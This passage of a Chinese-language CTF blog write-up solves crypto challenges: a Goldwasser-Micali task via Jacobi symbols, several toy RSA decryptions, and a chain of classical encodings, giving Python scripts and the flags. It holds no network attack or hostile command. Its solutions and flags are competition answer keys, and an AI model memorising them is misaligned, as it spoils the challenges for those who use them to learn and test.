1006229610175567855209117721408416419896921240126676949824724, 4206431689326446028142220658552064336105749936096602165359, 893846509909828693967573302731018066461118006150050253703744, 878425189026235350891203121924637130803808920422558040493294, 730047416245095988472212050949689633327186823542036387345181, 648095719945750715387983948406690533087473721929975873848169, 213513454359755001454814601053555627585345770061082141021326, 350001050012957205656929492039628823072469208940960439158263, 1016858635000037892730835311903706149371704230428070443107320, 1040987439471207869975679257301693610464700899302787643642354, 1194690615352550474729309715449838057220521596135246725909553, 508165053077110820797186371383859674371399129952105597675096, 266494438294281492504556232035584920066331725618646155019547, 28469482072427012244441092412738741355431846649166066368980, 790175775999108776289865518368056397969387298334297622465909, 590581138260907253939363764832940322585129285968275409510634, 221909012579985462013325803334419731308959816500415305934495, 1063780559219791515938747204569742799329237935871594345400252, 977747525495509380693721486866821791065499754056415279744653, 346306061371595730004513789139807509540063462412619321003626, 456103179467597859705969406860196938169100856240100927540401, 969300078509189631808517876996065933181606409375207150288464, 1029806631220370012120597683927351131622576733031694535189521, 344896431603140401163996810922500893279239069499717183710501, 430000423804197030568046280589772094106128395099434235915031, 700179843567016021775399107572964843751703290591400960796112, 961227906080189143689698720420426659986080298413605666115640, 607209606799750473714271393200060455739097869884727178692312, 106958847163040842225140399905505511449479709017540851084532, 953369942103273809257762268859167463617831445026988544378658, 428269440686506672744282327102546440435442014650795927162711, 56621803434665963032193024056111306570802155743250152849716, 800707635631355839166448276143596444307614901816577459076131, 1032256515703247765067950588859299047987257001987777631061065, 813725055801254665600156259482200403981770576173968929131487, 940024839745068011043019236327963504645352520797347949823455, 1065005324140908547287467504568283884363143527586278243210801, 1087828777506290663525994551834233065465427418753806182842291, 668387132001968449612224853010931354244797738682007519611989, 563185246196177998134932666270526715161378776103340983046580, 148292872313931508344196679476720973752571125303712466045656, 413889563851226543249984374872220761253120628252088546262699, 853542105910386365929770611480736086723126396438880650918917, 59730458840715910492468261806200793684923819793480597554146, 792260492800286127199649276659137441324248689470594987965190, 753608630500639136668081531883097047491651258191552267413126, 33514911499472634865669915075769163328171019557849259474018, 634963859228206842307837566519244534650818456901841184879977, 219354096455968590219445072777282329948785844491217770978344, 1123377226439583158729762969668999276741275445803396272436031, 357765295513680388973981712560200525235334734759663454993805, 385868499980630535766019957877752149506518574529845752144666, 138578212294299392480319417966870656714476525885983752756188, 1110526796192425688386237355263892073046060477008920073455044, 244699783645221387947312903861559688207612147588246639081699, 583209905862562678600202085212425597809036630416117298854978, 1207854793808762194414317661151529169444903662139065050090746, 1127506983223466275821900811940356395242309493951089427884032, 526185119576631048584313761548704536031634598332129570964689, 266882032196696984660521486449809902101615921156569537960109, 1188118705564450461919200724390473040524626320052324478509883, 682831747455078454647149830819696088960233603851250102828667, 669419928942561433130809268138650695825596612075801278942980, 1077750630919867687880983437504767304166615787212813240073843, 486023540111308483450127320955599047045479654684477043315645, 409429366346146233850088863324915025465847596238000661872172, 779883595226131237594759409249289551033410304517183865388408, 1155872225708857920911178110668279174877878422508206228579940, 411063490066038942009369947241345843238439795078686488373864, 1243453053541946030699872676712518536022061850799945414120045, 871711034820169700581685353768658469631429266493677466057997, 601920686459160120670719526703980120744719013393032353678765, 329932100141177850249406090412821976994089707958551194468769, 558327299751202100333335353826111016492585371503632197870640, 113444032302978611299580451314055133491399096282744687816086, 152525914892717139057165748051966776217223953242540511499945, 965404850400527912039904270871065001313018148780552532312669, 313557099445185696402013375071955475516203519824979749629786, 952254159335810337756614972813240144837526566801182319987154]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="分析：-4"><a href="#分析：-4" class="headerlink" title="分析："></a><strong>分析：</strong></h4><h5 id="1）提示分析："><a href="#1）提示分析：" class="headerlink" title="1）提示分析："></a><strong>1）提示分析：</strong></h5><p>题目中提供了提示连接。在链接文章中，作者给出了二次同余方程的解法，来解决两种方程：<br>$$<br>x^2≡n(mod p)<br>$$</p>
<p>$$<br>x^2≡n(mod p^n)<br>$$</p>
<h5 id="2）附件分析："><a href="#2）附件分析：" class="headerlink" title="2）附件分析："></a><strong>2）附件分析：</strong></h5><p>加密过程其实就是对一串二进制字符进行变换。变换的法则是：<br>$$<br>((3^(i+2x)modn)<em>x^2)modn=c<br>$$<br>其中i=0或1，是原文；n=p</em>q(p,q为素数)；x是随机数，且满足与n互质；c是密文。从附件也可以看出，有167个密文元素，就是说原文的长度是167。</p>
<h5 id="3）综合分析及解题："><a href="#3）综合分析及解题：" class="headerlink" title="3）综合分析及解题："></a><strong>3）综合分析及解题：</strong></h5><p>解题过程从两方面开展。</p>
<h6 id="1-二次同余方程的求解、解数"><a href="#1-二次同余方程的求解、解数" class="headerlink" title="1.二次同余方程的求解、解数"></a><strong>1.二次同余方程的求解、解数</strong></h6><p><strong>学习资源：</strong></p>
<p>1.信息安全数学基础（上海交大，b站课程）</p>
<p>2.计算勒让德符号（legendre symbol）代码实现（含运行结果）_橙子的坚果奶盖的博客-CSDN博客(<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46447549/article/details/114372252">https://blog.csdn.net/weixin_46447549/article/details/114372252</a>)</p>
<p>3.勒让德符号和雅可比符号_Kagamigawa Noelle-CSDN博客_雅可比符号(<a target="_blank" rel="noopener" href="https://blog.csdn.net/happy_single/article/details/106125155">https://blog.csdn.net/happy_single/article/details/106125155</a>)</p>
<p>4.二次同余式解数的判定(<a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/509006719.html">https://zhidao.baidu.com/question/509006719.html</a>)</p>
<p>5.百度百科：勒让德符号、雅可比符号</p>
<p>对于方程<br>$$<br>x^2≡y(modn),n=p*q<br>$$<br>其等价于方程组<br>$$<br>x^2≡y(modp)<br>$$</p>
<p>$$<br>x^2≡y(modq)<br>$$</p>
<p>对判定方程是否有解、有多少个解的问题，统称为方程的解数。</p>
<p>对模数为素数的二次同余方程解数的判定，通常使用Legendre(勒让德)符号。</p>
<p><img src="https://static01.imgkr.com/temp/295963f39c654eb7a21c25d03432bdb7.png"></p>
<p>勒让德符号有其快速计算方法。</p>
<p><img src="https://static01.imgkr.com/temp/387f0b66087447628ab7bdb4c460d12a.png"></p>
<p>我编写了大整数求勒让德符号的程序(python):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ee</span>(<span class="params">a</span>):</span></span><br><span class="line">    e=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(a%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">        a=a/<span class="number">2</span></span><br><span class="line">        e=e+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L_FAST</span>(<span class="params">a,p</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span>(a==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(ee(a)%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">            s=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(p%<span class="number">8</span>==<span class="number">1</span> <span class="keyword">or</span> p%<span class="number">8</span>==<span class="number">7</span>):</span><br><span class="line">                s=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(p%<span class="number">8</span>==<span class="number">3</span> <span class="keyword">or</span> p%<span class="number">8</span> == <span class="number">5</span>):</span><br><span class="line">                s=-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(p%<span class="number">4</span>==<span class="number">3</span> <span class="keyword">and</span> a%<span class="number">4</span>==<span class="number">3</span>):</span><br><span class="line">            s=-s</span><br><span class="line">        p1=p%a</span><br><span class="line">        <span class="keyword">if</span>(a==<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> s*L_FAST(p1,a)</span><br></pre></td></tr></table></figure>

<p>雅可比符号是对勒让德符号的扩展。雅可比符号能解决模数n是合数的情况。对于题目的n=p*q,这是一个很大的帮助。</p>
<p>雅可比符号是这样定义的：<br>$$<br>J p (x) =</p>
<p>+1,x ∈ QR p<br>$$</p>
<p>$$<br>−1,x / ∈ QR p .<br>$$</p>
<h6 id="2-学习GM-Goldwasser-Micali-加密算法"><a href="#2-学习GM-Goldwasser-Micali-加密算法" class="headerlink" title="2.学习GM(Goldwasser-Micali)加密算法"></a><strong>2.学习GM(Goldwasser-Micali)加密算法</strong></h6><p><a target="_blank" rel="noopener" href="https://www.csa.iisc.ac.in/~arpita/Cryptography15/CT7.pdf">https://www.csa.iisc.ac.in/~arpita/Cryptography15/CT7.pdf</a></p>
<p>这篇论文详细解释了GM加密算法的理论基础、加密解密算法以及算法复杂度的证明。</p>
<p>论文中对判断模n二次剩余有如下定理：</p>
<p>设y满足<br>$$<br>y=yq(p)<br>$$</p>
<p>$$<br>y=yp(p)<br>$$</p>
<p>有唯一的解（也即中国剩余定理），则y是模N的二次剩余当且仅当yp是p的二次剩余且yq是q的二次剩余。</p>
<p>证明从略。</p>
<p><img src="https://static01.imgkr.com/temp/96654c1f483d4eca9ec401bafd3cd455.png"></p>
<p>算法1：产生N</p>
<p><img src="https://static01.imgkr.com/temp/b58f8d4bef874facbdb54286c212f319.png"></p>
<p>算法2：加密</p>
<p><img src="https://static01.imgkr.com/temp/752a1d5c9cbb49b2a8e5f796b80b1d17.png"></p>
<p>算法3：解密</p>
<p>编出解密程序（省去赋值）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> gmpy2.jacobi(a[i], n) == -<span class="number">1</span>:</span><br><span class="line">        s += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">number = <span class="built_in">int</span>(s, <span class="number">2</span>)</span><br><span class="line">output = long_to_bytes(number)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>

<p>结果：b’SYC{run_to_the_light}’</p>
<h3 id="baby-house-of-rsa"><a href="#baby-house-of-rsa" class="headerlink" title="baby house of rsa"></a><strong>baby house of rsa</strong></h3><h5 id="0-super-baby"><a href="#0-super-baby" class="headerlink" title="0 super baby"></a><strong>0 super baby</strong></h5><p>给出e,n,c,d,求m.</p>
<p>代码：（省去赋值）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m=gmpy2.powmod(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p>结果：b’8848’</p>
<h5 id="1-very-baby"><a href="#1-very-baby" class="headerlink" title="1 very baby"></a><strong>1 very baby</strong></h5><p>已知n=a1* a2 *a3 *a4,求m</p>
<p>代码（省去赋值）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">phi=(AA[<span class="number">0</span>]-<span class="number">1</span>)*(AA[<span class="number">1</span>]-<span class="number">1</span>)*(AA[<span class="number">2</span>]-<span class="number">1</span>)*(AA[<span class="number">3</span>]-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=gmpy2.powmod(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p>结果：b’114514’</p>
<h5 id="2-beyond-baby"><a href="#2-beyond-baby" class="headerlink" title="2 beyond baby"></a><strong>2 beyond baby</strong></h5><p>n=a1^4,对应的phi=a1^4-a1^3</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">phi = a1**<span class="number">4</span>-a1**<span class="number">3</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=gmpy2.powmod(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p>结果：b’226’</p>
<h5 id="3-infinity-baby"><a href="#3-infinity-baby" class="headerlink" title="3 infinity baby"></a><strong>3 infinity baby</strong></h5><p>给出e,n,c,p,q,求m</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">266266790497495211367281021249406677231</span></span><br><span class="line">c=<span class="number">234292670742280314534663243185847290744</span></span><br><span class="line">p=<span class="number">16055431013588849203</span></span><br><span class="line">q=<span class="number">16584219400409416277</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=gmpy2.powmod(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果：b’1919810’</p>
<p>连起来得到flag.zip密钥。SYC{RSA_is_really_easy}</p>
<h3 id="easy-house-of-Classic-Crypto"><a href="#easy-house-of-Classic-Crypto" class="headerlink" title="easy house of Classic Crypto"></a><strong>easy house of Classic Crypto</strong></h3><h4 id="附件：-5"><a href="#附件：-5" class="headerlink" title="附件："></a><strong>附件：</strong></h4><p>五段密文，以不同形式加密。</p>
<p>T0s=</p>
<p>base64编码，解码得到“OK”</p>
<p>4e6577</p>
<p>十六进制转文本，解码得到“New”</p>
<p>-.– — ..-</p>
<p>摩尔斯密码，解密得到“you”</p>
<p>ABABAABBABABBBABABBA</p>
<p>培根密码，解密得到“know”</p>
<p>jung vf pynffvp pelcgb</p>
<p>凯撒密码，偏移量13，解密得到“what is classic crypto”</p>
<p>连起来得到flag.zip密钥。</p>
<p>SYC{Meaningless_crypto}</p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
                        
                    
                        
                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
		data-enable='true'
        data-ae='false'
        data-ci='01ed89abee289d37f2f8'
        data-cs='51741e819059e2ea7ab6c6f3d0fa0ac631d1d975'
        data-r='MyBlogComments'
        data-o='Equinox-shame'
        data-a='Equinox-shame'
        data-d='false'
    >查看评论</div>


    </div>
    
</div>


    </div>
</div>
</body>

<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



<script type="text/x-mathjax-config">
    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
        messageStyle: "none"
    });
</script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>




</html>
